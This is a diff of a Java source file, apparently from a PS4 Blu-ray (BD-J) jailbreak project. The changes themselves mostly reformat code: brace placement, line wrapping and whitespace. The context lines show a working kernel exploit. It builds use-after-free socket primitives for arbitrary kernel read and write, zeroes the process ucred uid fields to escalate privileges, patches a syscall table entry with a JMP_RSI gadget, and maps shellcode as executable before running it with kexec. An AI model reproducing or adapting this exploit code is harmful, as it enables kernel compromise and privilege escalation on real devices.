@@ -2,7 +2,6 @@ package org.bdj.external;
 
 import java.util.*;
 import java.io.*;
-
 import org.bdj.api.*;
 import org.bdj.Status;
 
@@ -180,7 +179,8 @@ public class Poops {
     }
 
     private static int getsockopt(int s, int level, int optname, Buffer optval, Int32 optlen) {
-        return (int) Helper.api.call(getsockopt, s, level, optname, optval != null ? optval.address() : 0, optlen != null ? optlen.address() : 0);
+        return (int) Helper.api.call(getsockopt, s, level, optname, optval != null ? optval.address() : 0,
+                optlen != null ? optlen.address() : 0);
     }
 
     private static int setsockopt(int s, int level, int optname, Buffer optval, int optlen) {
@@ -210,7 +210,7 @@ public class Poops {
     }
 
     private static int cpuset_setaffinity(int level, int which, long id, long setsize, Buffer mask) {
-        return (int)api.call(cpuset_setaffinity, level, which, id, setsize, mask != null ? mask.address() : 0);
+        return (int) api.call(cpuset_setaffinity, level, which, id, setsize, mask != null ? mask.address() : 0);
     }
 
     public static void cleanup() {
@@ -226,7 +226,8 @@ public class Poops {
                 iovThreads[i].interrupt();
                 try {
                     iovThreads[i].join();
-                } catch (Exception e) {}
+                } catch (Exception e) {
+                }
             }
         }
         for (int i = 0; i < UIO_THREAD_NUM; i++) {
@@ -234,11 +235,12 @@ public class Poops {
                 uioThreads[i].interrupt();
                 try {
                     uioThreads[i].join();
-                } catch (Exception e) {}
+                } catch (Exception e) {
+                }
             }
         }
         if (previousCore >= 0 && previousCore != 4) {
-            //Status.println("back to core " + previousCore);
+            // Status.println("back to core " + previousCore);
             Helper.pinToCore(previousCore);
             previousCore = -1;
         }
@@ -323,8 +325,7 @@ public class Poops {
             read(uioSs0, leakBuffers[i], leakBuffers[i].size());
             if (leakBuffers[i].getLong(0x00) != 0x4141414141414141L) {
                 triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
-                if (triplets[1] == -1)
-                {
+                if (triplets[1] == -1) {
                     Status.println("kreadSlow triplet failure 1");
                     return null;
                 }
@@ -334,8 +335,7 @@ public class Poops {
         uioState.waitForFinished();
         write(iovSs1, tmp, Int8.SIZE);
         triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
-        if (triplets[2] == -1)
-        {
+        if (triplets[2] == -1) {
             Status.println("kreadSlow triplet failure 2");
             return null;
         }
@@ -381,16 +381,14 @@ public class Poops {
             write(uioSs1, buffer, buffer.size());
         }
         triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
-        if (triplets[1] == -1)
-        {
+        if (triplets[1] == -1) {
             Status.println("kwriteSlow triplet failure 1");
             return false;
         }
         uioState.waitForFinished();
         write(iovSs1, tmp, Int8.SIZE);
         triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
-        if (triplets[2] == -1)
-        {
+        if (triplets[2] == -1) {
             Status.println("kwriteSlow triplet failure 2");
             return false;
         }
@@ -423,8 +421,10 @@ public class Poops {
             sched_yield = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "sched_yield");
             cpuset_setaffinity = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "cpuset_setaffinity");
             __sys_netcontrol = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "__sys_netcontrol");
-            if (dup == 0 || close == 0 || read == 0 || readv == 0 || write == 0 || writev == 0  || ioctl == 0 || fcntl == 0 || pipe == 0 || kqueue == 0 || socket == 0 || socketpair == 0 ||
-            recvmsg == 0 || getsockopt == 0 || setsockopt == 0 || setuid == 0 || getpid == 0 || sched_yield == 0 || __sys_netcontrol == 0 || cpuset_setaffinity == 0) {
+            if (dup == 0 || close == 0 || read == 0 || readv == 0 || write == 0 || writev == 0 || ioctl == 0
+                    || fcntl == 0 || pipe == 0 || kqueue == 0 || socket == 0 || socketpair == 0 ||
+                    recvmsg == 0 || getsockopt == 0 || setsockopt == 0 || setuid == 0 || getpid == 0 || sched_yield == 0
+                    || __sys_netcontrol == 0 || cpuset_setaffinity == 0) {
                 Status.println("failed to resolve symbols");
                 return false;
             }
@@ -654,8 +654,7 @@ public class Poops {
                 close(kq);
             }
 
-            if (timeout <= 0)
-            {
+            if (timeout <= 0) {
                 Status.println("kqueue realloc failed");
                 return false;
             }
@@ -666,8 +665,7 @@ public class Poops {
 
             // Find triplet.
             triplets[1] = findTriplet(triplets[0], triplets[2], UAF_TRIES);
-            if (triplets[1] == -1)
-            {
+            if (triplets[1] == -1) {
                 Status.println("kqueue triplets 1 failed ");
                 return false;
             }
@@ -698,8 +696,7 @@ public class Poops {
             }
 
             removeUafFile();
-        } catch (Exception e)
-        {
+        } catch (Exception e) {
             Status.println("exception during stage 1");
             return false;
         }
@@ -735,7 +732,7 @@ public class Poops {
         // get curproc
         Int32Array pipeFd = new Int32Array(2);
         pipe(pipeFd);
-        
+
         Int32 currPid = new Int32();
         int curpid = getpid();
         currPid.set(curpid);
@@ -762,7 +759,7 @@ public class Poops {
         long OFFSET_P_UCRED = 0x40;
         long procFd = kread64(curproc + KernelOffset.PROC_FD);
         long ucred = kread64(curproc + OFFSET_P_UCRED);
-        
+
         if ((procFd >>> 48) != 0xFFFF) {
             Status.println("bad procfd");
             return false;
@@ -771,7 +768,7 @@ public class Poops {
             Status.println("bad ucred");
             return false;
         }
-        
+
         kwrite32(ucred + 0x04, 0); // cr_uid
         kwrite32(ucred + 0x08, 0); // cr_ruid
         kwrite32(ucred + 0x0C, 0); // cr_svuid
@@ -822,8 +819,7 @@ public class Poops {
                 read(iovSs0, tmp, Int8.SIZE);
             }
             close(dup(uafSock));
-            if (!findTwins(TWIN_TRIES))
-            {
+            if (!findTwins(TWIN_TRIES)) {
                 Status.println("twins failed");
                 return false;
             }
@@ -842,30 +838,26 @@ public class Poops {
                 iovState.waitForFinished();
                 read(iovSs0, tmp, Int8.SIZE);
             }
-            if (timeout <= 0)
-            {
+            if (timeout <= 0) {
                 Status.println("iov reclaim failed");
                 return false;
             }
             triplets[0] = twins[0];
             close(dup(uafSock));
             triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
-            if (triplets[1] == -1)
-            {
+            if (triplets[1] == -1) {
                 Status.println("triplets 1 failed");
                 return false;
             }
             write(iovSs1, tmp, Int8.SIZE);
             triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
-            if (triplets[2] == -1)
-            {
+            if (triplets[2] == -1) {
                 Status.println("triplets 2 failed");
                 return false;
             }
             iovState.waitForFinished();
             read(iovSs0, tmp, Int8.SIZE);
-        } catch (Exception e)
-        {
+        } catch (Exception e) {
             Status.println("exception during stage 0");
             return false;
         }
@@ -889,32 +881,32 @@ public class Poops {
             kwrite32(sysent661Addr, 2);
             kwrite64(sysent661Addr + 8, kBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
             kwrite32(sysent661Addr + 0x2c, 1);
-            
+
             int PROT_READ = 0x1;
             int PROT_WRITE = 0x2;
             int PROT_EXEC = 0x4;
             int PROT_RW = PROT_READ | PROT_WRITE;
             int PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
-            
+
             int alignedMemsz = 0x10000;
             // create shm with exec permission
-            long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long)alignedMemsz, (long)PROT_RWX);
+            long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long) alignedMemsz, (long) PROT_RWX);
             // create shm alias with write permission
-            long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long)PROT_RW);
+            long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long) PROT_RW);
             // map shadow mapping and write into it
-            Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long)alignedMemsz, (long)PROT_RW, 0x11L, writeHandle, 0L);
+            Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long) alignedMemsz, (long) PROT_RW, 0x11L, writeHandle,
+                    0L);
             for (int i = 0; i < shellcode.length; i++) {
                 api.write8(shadowMappingAddr + i, shellcode[i]);
             }
             // map executable segment
-            Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long)alignedMemsz, (long)PROT_RWX, 0x11L, execHandle, 0L);
+            Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long) alignedMemsz, (long) PROT_RWX, 0x11L, execHandle, 0L);
             Helper.syscall(Helper.SYS_KEXEC, mappingAddr);
             kwrite32(sysent661Addr, syNarg);
             kwrite64(sysent661Addr + 8, syCall);
             kwrite32(sysent661Addr + 0x2c, syThrcnt);
             Helper.syscall(Helper.SYS_CLOSE, writeHandle);
-        } catch (Exception e)
-        {
+        } catch (Exception e) {
 
         }
         return true;
@@ -929,8 +921,7 @@ public class Poops {
 
         // perform setup
         Status.println("Pre-configuration");
-        if (!performSetup())
-        {
+        if (!performSetup()) {
             Status.println("pre-config failure");
             cleanup();
             return -3;
@@ -942,7 +933,7 @@ public class Poops {
             return -4;
         }
 
-        // do not print to the console to increase stability here
+        // do not print to the Status to increase stability here
         if (!achieveRw(KQUEUE_TRIES)) {
             Status.println("Leak / RW failed");
             cleanup();
@@ -972,9 +963,11 @@ public class Poops {
 
     static class IovThread extends Thread {
         private final WorkerState state;
+
         public IovThread(WorkerState state) {
             this.state = state;
         }
+
         public void run() {
             cpusetSetAffinity(4);
             Helper.setRealtimePriority(256);
@@ -993,8 +986,9 @@ public class Poops {
         private final WorkerState state;
 
         public UioThread(WorkerState state) {
-        this.state = state;
+            this.state = state;
         }
+
         public void run() {
             cpusetSetAffinity(4);
             Helper.setRealtimePriority(256);
